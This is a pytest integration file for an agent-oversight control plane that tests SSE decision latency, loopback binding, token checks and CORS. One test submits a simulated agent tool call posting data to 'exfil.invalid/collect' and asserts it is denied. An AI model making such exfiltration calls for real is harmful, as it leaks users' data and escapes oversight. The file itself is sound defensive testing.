"""SSE behaviour and latency against a real uvicorn server (AD-14).

The latency figure here is the *local* end-to-end delay from a decision being recorded to
its frame arriving on the stream. It is reported as a measurement against a 2 second
local target, not as a claim about anything internet-scale.
"""

from __future__ import annotations

import json
import threading
import time
from datetime import UTC, datetime
from pathlib import Path

import httpx
import pytest

from agent_drift.seed import build_contract
from agent_drift.store import Store

from .live_server import live_server

pytestmark = pytest.mark.integration

SSE_LOCAL_TARGET_S = 2.0

LATENCY_EVIDENCE = Path(__file__).resolve().parents[2] / "var" / "sse-latency.json"


def _record_latency(seconds: float) -> None:
    """Write the measured figure so AD-14 cites an observation, not a target."""
    LATENCY_EVIDENCE.parent.mkdir(parents=True, exist_ok=True)
    LATENCY_EVIDENCE.write_text(
        json.dumps(
            {
                "measured_at": datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ"),
                "latency_s": round(seconds, 4),
                "target_s": SSE_LOCAL_TARGET_S,
                "within_target": seconds <= SSE_LOCAL_TARGET_S,
            },
            indent=2,
        )
        + "\n",
        encoding="utf-8",
    )
    print(
        f"\n[AD-14] decision reached the SSE stream in {seconds * 1000:.1f} ms "
        f"(local target {SSE_LOCAL_TARGET_S * 1000:.0f} ms)"
    )


@pytest.fixture
def server(db_path: Path, fixture_state: Path):
    """A live control plane with the demo contracts registered."""
    store = Store(db_path)
    try:
        for name in ("readonly", "docswrite"):
            store.put_contract(build_contract(name))
    finally:
        store.close()
    with live_server(db_path, fixture_state=fixture_state) as handle:
        yield handle


class TestSseLive:
    """A real client, a real stream, a real measurement."""

    def test_hello_frame_reports_the_cursor(self, server) -> None:
        with httpx.stream("GET", f"{server.base_url}/api/events/stream?since=0", timeout=20.0) as response:
            assert response.status_code == 200
            assert "text/event-stream" in response.headers["content-type"]
            for line in response.iter_lines():
                if line.startswith("data: "):
                    payload = json.loads(line[6:])
                    assert payload["since"] == 0
                    assert "latest_seq" in payload
                    return
        pytest.fail("no hello frame arrived")

    def test_decision_appears_on_the_stream_within_the_local_target(self, server) -> None:
        """Measured, not asserted blind: the elapsed time is part of the failure message."""
        received: list[tuple[float, dict]] = []
        ready = threading.Event()
        stop = threading.Event()

        def consume() -> None:
            try:
                with httpx.stream("GET", f"{server.base_url}/api/events/stream", timeout=30.0) as response:
                    for line in response.iter_lines():
                        if line.startswith("data: "):
                            payload = json.loads(line[6:])
                            if "latest_seq" in payload and "kind" not in payload:
                                ready.set()
                                continue
                            received.append((time.monotonic(), payload))
                            if payload.get("kind", "").startswith("DECISION_"):
                                stop.set()
                                return
                        if stop.is_set():
                            return
            except Exception:
                stop.set()

        thread = threading.Thread(target=consume, daemon=True)
        thread.start()
        assert ready.wait(timeout=15), "the stream never sent its hello frame"

        posted_at = time.monotonic()
        response = server.post(
            "/api/attempts/evaluate",
            json={
                "task_id": "demo-repo-review",
                "tool_name": "network.http_post",
                "args": {"url": "https://exfil.invalid/collect", "body": "x"},
            },
        )
        assert response.status_code == 200
        assert response.json()["status"] == "deny"

        assert stop.wait(timeout=15), "no decision frame arrived on the stream"
        thread.join(timeout=5)

        decisions = [
            (at, payload) for at, payload in received if payload.get("kind", "").startswith("DECISION_")
        ]
        assert decisions, f"only non-decision frames arrived: {[p.get('kind') for _, p in received]}"
        latency = decisions[0][0] - posted_at
        _record_latency(latency)
        assert latency <= SSE_LOCAL_TARGET_S, (
            f"decision took {latency:.3f}s to appear on the stream, "
            f"above the {SSE_LOCAL_TARGET_S}s local target"
        )
        assert decisions[0][1]["payload"]["status"] == "deny"

    def test_stream_sends_nothing_before_a_decision(self, server) -> None:
        """A stream opened at the head must not replay history."""
        latest = server.get("/api/events").json()["latest_seq"]
        frames: list[str] = []
        with httpx.stream(
            "GET", f"{server.base_url}/api/events/stream?since={latest}", timeout=10.0
        ) as response:
            start = time.monotonic()
            for line in response.iter_lines():
                frames.append(line)
                if time.monotonic() - start > 1.2:
                    break
        assert not any(frame.startswith("event: decision") for frame in frames), frames[:10]


class TestLiveHttpBehaviour:
    """A few properties that only a real server exercises."""

    def test_health_is_reachable(self, server) -> None:
        body = server.get("/healthz").json()
        assert body["status"] == "ok"
        assert body["mcp_protocol_revision"] == "2026-07-28"

    def test_api_is_bound_to_loopback_only(self, server) -> None:
        """Defence in depth: the port must not answer on a non-loopback interface."""
        import socket

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as probe:
            probe.settimeout(1.5)
            hostname_ip = socket.gethostbyname(socket.gethostname())
            if hostname_ip.startswith("127."):
                pytest.skip("this host resolves its own name to loopback; nothing to prove")
            assert probe.connect_ex((hostname_ip, server.port)) != 0, (
                "the control plane answered on a non-loopback address"
            )

    def test_mutation_requires_the_token_over_real_http(self, server) -> None:
        response = httpx.post(
            f"{server.base_url}/api/tasks",
            json={"task_id": "x", "user_goal": "y"},
            timeout=10.0,
        )
        assert response.status_code == 401

    def test_cors_allowlist_does_not_echo_arbitrary_origins(self, server) -> None:
        response = httpx.get(
            f"{server.base_url}/api/tasks",
            headers={"origin": "https://evil.test"},
            timeout=10.0,
        )
        assert response.headers.get("access-control-allow-origin") != "https://evil.test"

    def test_docs_and_openapi_are_served(self, server) -> None:
        assert server.get("/docs").status_code == 200
        assert server.get("/openapi.json").json()["openapi"].startswith("3.1")
